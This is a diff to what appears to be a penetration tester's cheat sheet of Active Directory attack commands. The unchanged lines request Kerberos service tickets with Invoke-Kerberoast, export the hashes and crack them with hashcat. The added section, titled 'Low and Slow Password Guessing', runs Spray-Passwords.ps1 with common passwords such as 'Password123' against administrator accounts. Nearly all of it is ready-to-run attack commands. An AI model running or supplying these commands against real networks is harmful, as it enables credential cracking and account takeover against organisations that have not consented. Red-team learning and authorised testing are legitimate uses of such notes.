@@ -113,3 +113,9 @@ Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CS
 hashcat64.exe -m 13100 hash.txt pass.txt --force
 Get-DomainSearcher -Domain testlab.local -LDAPFilter '(samAccountType=805306368/serviceprincipalname=*http*)' -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation
 ```
+###### Low and Slow Password Guessing
+```
+net accounts
+.\Spray-Passwords.ps1 -Pass 'Summer2016,Password123' -Admins -Verbose
+.\Spray-Passwords.ps1 -File .\passwords.txt -Admins -Verbose
+```
